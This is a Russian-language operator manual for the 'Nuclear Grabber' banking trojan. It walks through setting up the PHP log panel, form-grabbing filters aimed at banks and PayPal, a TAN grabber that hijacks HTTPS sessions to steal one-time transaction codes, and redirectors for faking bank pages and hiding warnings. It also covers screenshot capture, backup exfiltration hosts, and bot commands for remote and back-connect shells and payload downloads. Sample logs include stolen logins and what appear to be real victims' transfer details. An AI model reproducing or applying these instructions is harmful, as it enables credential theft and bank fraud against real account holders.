Настройка Nuclear Grabber
----------------------------------------------------------------------------

порядок настройки

- выбрать папку на сайте, где будут собираться логи (можно в корне сайта)
- поместить в эту папку data.php и config.php ( права 755)
- создать там же паку logs, поставить на неё CHMOD 777

       
настройка сервера троя 
запустить config.exe
- при первом запуске получить ключ (ies.key), поместить рядом с конфигом.
 
- запустить CMDMAKER.EXE, прописать путь к config.php на твоём сайте БЕЗ http://
        (например - tvoilogisait.net/folder/config.php) , нажать save
- настройка для сбора логов в MySQL (НЕ ОБЯЗАТЕЛЬНО)
-В папке logs должен создасться файл cfd.ini
Это файл, через который ваш трой будет получать комманды от вас.
Управление троем осуществляется программой  CMDMAKER.EXE

------------------------------------------------------------------------------
Если вам нужно все же настроить отправку отчетов в базу,то делаете так:

настройка MySQL

создать базу, выполнить sql комманду -

CREATE TABLE `pass` (
`add_date` datetime NOT NULL default '0000-00-00 00:00:00',
`uidlog` varchar(255) NOT NULL default '',
`ip` varchar(20) NOT NULL default '',
`form` longtext NOT NULL
) TYPE=MyISAM;

прописать в data.php настройки - имя базы, логин, пароль, установить $mysql_do=1;
----------------------------------------------------------------------------------------
настройка сервера троя (продолжение)

В config.exe:

- ввести путь к установленному ранее скрипту (БЕЗ http:// !!!)
- ввести ключевые слова в фильтр формграббера (или All для захвата всех POST данных)
Фильтр подразумевает фразу, слово или часть слова, которая может встретится в заголовке/адресе сайта/строке запроса
        (для того ресурса, информацию с которого следует перехватить)

        пример - слово   gold   будет относиться к сайтам
        e-gold.com
        intgold.com
        surf4gold.org

        при введённом слове  bank   перехватится информация например с таких сайтов -
        royalbank.com (слово встречается в адресе)
        bankreferatov.ru (тоже банк =)))
        halifax.co.uk (слово встречается в заголовке страници)

Пример лога:
----------------------------

login_email=slash@slash.com&login_password=slash&submit.x=Log+In&form_charset=UTF-8 (сграбленные данные)
PayPal - Welcome - Microsoft Internet Explorer        (заголовок страницы)
http://www.paypal.com/us/              (данные из адресной строки)
[-- paypal.com/us/cgi-bin/webscr --]    (адрес, куда отправляется форма)
[Member Log-InForgot your email address?Forgot your password?Email AddressPassword] (околоформенные слова)

[4654654720454065780[Corpse]        (UID (числовой идентификатор + имя юзера на компе))
[IP:195.222.84.199 18.08.2004 00:31:42]  (IP ; дата ; время когда произведена запись) 



Настройка TANграббера:

- В опции TAN-grabber добавьте или удалите те банки, при заходе на которые TAN должны или не должны собираться 
(зависит добавили ли вы или удалил банк из списка)

принцип работы - трой вклинивается в https сессию и подменяет TAN, затем запоминает его и больше не даёт использовать

танграббер настраивается путём добавления пары фильтр:имя_тана

фильтр служит для идентификации сайта, где нужно перехватить TAN
фильтр выбирается способом, аналогичным описанному выше
имя TANа в запросе это параметр, которым передаётся TAN

пример из логов -

во время передачи тана в банк трой перехватывает и записыывает в лог все детали перевода вместе с таном
в этом логе можно посмотреть каким параметром он передаётся.

Counter=9&DestinationName=barmherzige+brueder&DestinationNameExtension=&DestinationNumber=802
&DestinationBLZ=75050000&DestinationBankname=SPK+REGENSBURG&Amount=12%2C35&Description1=166680&
Description2=&Number=7457120&ExecutionDate=&NameEmployer=Herbert+Hornauer&TAN=597252&ExecuteTransfer.x=19&ExecuteTransfer.y=12
Microsoft Internet Explorer
www.vr-ebanking.de/index.php?RZBK=2669

как видно в данном случае вводятся данные перевода, сумма и "TAN=597252" т.е. имя тана в запросе "TAN"

KktNrTanEnz=972549
InternetBanking - Microsoft Internet Explorer
[-- internetbanking.gad.de/banking/portal?bankid=6126 --]

в данном случае KktNrTanEnz=972549 т.е. имя тана в запросе "KktNrTanEnz"

по умолчанию в трой вбиты некоторые конторы.
варианты - как лучше определять имена ТАНов для НОВЫХ контор (это нужно только 1 раз) -

# 1. наверняка имеется много логов переводов с использованными TANами.
смотрим старые логи, цепляем оттуда имя TANа
(в банке может быть несколько параметров, с которыми передаётся TAN в зависимости от того, где он используется)

# 2. самое простое - сами заходим на любой акк, вбиваем любые данные на перевод 1 евро =)
вбиваем любой тан например 111222, смотрим каким именем он идёт в логе

# 3. просмотр содержимого html страницы
пример -
имеется код типа
< td class='table' nowrap='nowrap' valign='top'>
< font class="formtitle">enter TAN:< /font>
< /td>< td colspan="4" nowrap="nowrap">
< input size="14" maxlength="6" tabindex="2" name="MyTaN" type="password">< /td>

как видно около надписи "enter TAN:" идёт edit контрол с именем MyTaN (name="MyTaN")

*** второй вариант самый правильный и надёжный

*** за 1 перевод тащится 1 TAN
перехваченные TANы помечаются в логе как "TAN: XXXXXX"

чекбокс "2 TAN / session" укажет трою захватить 2 тана ПОДРЯД за 1 перевод
    плюс - сразу 2 TANа
    минус - во время перехвата на сервер банка передаётся неверный TAN вместо введённого
         тоесть 2 TANа - 2 "попытки" ввода холдером верного (перехваченные всегда будут неверны для холдера)
         если холдер и в третий раз введёт неверный TAN сам или попытается повторно
         ввести один из перехваченных его выкинет из акка или даже могут локнуть всю карту кодов
         из-за 3х неверных попыток.
         (есть особо упорные холдеры - пытаются вводлить TAN снова и снова, хотя банк выдаёт, что он неверен)


----------------------
почему TANы могут быть не рабочими?

- холдер ввёл УЖЕ использованный TAN или ввёл его неточно и трой его перехватил
- холдер активировал новую карту с TANами

TANграббер может использоваться для ЛЮБЫХ систем, где требуется РАЗОВО перехватить шестизначный пароль
----------------------------------------------------------------------------------------------------------
Настройка URL-редиректора


#  вся настройка заключается в добавлении пары "настроящий адрес"--"фальшивый адрес"
в поле ### указывается количество редиректов страницы с момента запуска броузера
*** не учитываются подгрузки страниц из кэша ; после перезапуска броузера счётчик обнуляется
предназначен для внесения нужных изменений в html код
(подмена баланса, свинчивание предупреждений, добавление новых полей в формы логона или изменение их и т.д.)
что надо учитывать -

# URL указываются БЕЗ префиксов (БЕЗ http://www.)
# URL "from" надо указывать БЕЗ параметров, тоесть всё, что идёт в URL до знака вопроса
# все элементы (рисунки, css, фрэймы, яваскрипты и т.п.) страницы, указанные относительными ссылками будут подгружены с ОРИГИНАЛЬНОГО САЙТА
# если надо подгрузить элемент из вне, надо прописывать его путь внутри страницы ПОЛНОСТЬЮ (http://***/****)
# можно редиректить фрэймы. для этого достаточно прописать вместо основной страницы в редиректор адрес фрэйма
# для удобства POST данные с оригинального URL передаются на фальшивый 

------------------------------------------------------------------------------------------------------------------
настройка доменного редиректора

доменный редиректор перенаправляет ВСЕ запросы с одного домена на другой настройка заключается в добавлении пары 
"настроящий домен"--"фальшивый домен"
--------------------------------------------------------------------------------------------------------------------


Опция Screenshot-URL позволит отправлять скриншоты вам на сайт при заходе на заданные сайты.
Это необходимо,например,для перехвата логина и пароля,если владелец аккаунта вводит данные с виртуальной клавиатуры.

-----------------------------------------------------------------------------------------------------------------

Опция Send logs to необходима для того,чтобы если ваш главный хост закроется,то трой мог слать данные на запасные
хосты. Трой предусматривает их сразу два.
------------------------------------------------------------------------------------------------------------------
 - нажать save, сохранить сервер троя под любым именем
*** кнопки save/load config позволяют подгружать или сохранять заранее приготовленную конфигурацию
-------------------------------------------------------------------------------------------------------------


Установка комманд:

в нужное время с помощью CMDMAKER.EXE можно подавать комманды ботам
CMDMAKER.EXE формирует комманды и передаёт их скрипту
боты периодически опрашивают скрипт и получают эти комманды

* SHELL
для запуска шелла -
при обычном коннэкте указывается PORT, на котором он повиснет
при бэкконнэкте указывается IP:PORT куда он должен сконнэктится
если shell запускается не по комманде, а фиксированно, то он привинчивается к 4040 порту

* Закачка файлов и (само) адпдейт -
нужно ввести путь к соответствующему файлу и нажать кнопку апдейта или закачки

* Обновление списка бэкапных хостов - нужно создать текстовой файл ,
в котором 1 строчка будет соответствовать 1 запасному хосту.
Вбить адрес файла в соответствующее поле в конфигураторе комманд.

для контроля выполнения комманды всеми ботами или конкретным ботом
ОБЯЗАТЕЛЬНО нужно выбрать All UID или конкретный UID, нажать set uid

load from web подгружает уже сохранённые комманды
save сохраняет комманды
---------------------------------------------------------------------------------------------------------------------










   

